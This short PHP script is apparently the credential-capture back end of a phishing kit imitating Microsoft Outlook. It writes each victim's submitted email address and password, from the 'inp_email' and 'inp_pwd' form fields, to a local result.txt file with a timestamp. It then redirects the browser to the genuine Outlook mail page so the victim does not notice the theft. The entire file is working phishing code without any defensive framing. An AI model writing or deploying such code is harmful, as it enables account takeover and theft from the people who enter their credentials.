<?php 

// Set the location to redirect the page
header ('Location: https://outlook.live.com/mail/0/');

// Open the text file in writing mode 
$file = fopen("result.txt", "a"); 

// foreach($_POST as $variable => $value) {
// 	fwrite($file, $variable . "=" . $value);
// 	fwrite($file, "\r\n"); 
// } 
fwrite($file, date("Y/m/d-H:i:s") . " - " . $_POST['inp_email'] . "=" . $_POST['inp_pwd']);

fwrite($file, "\r\n"); 
fclose($file); 
exit; 
?> 
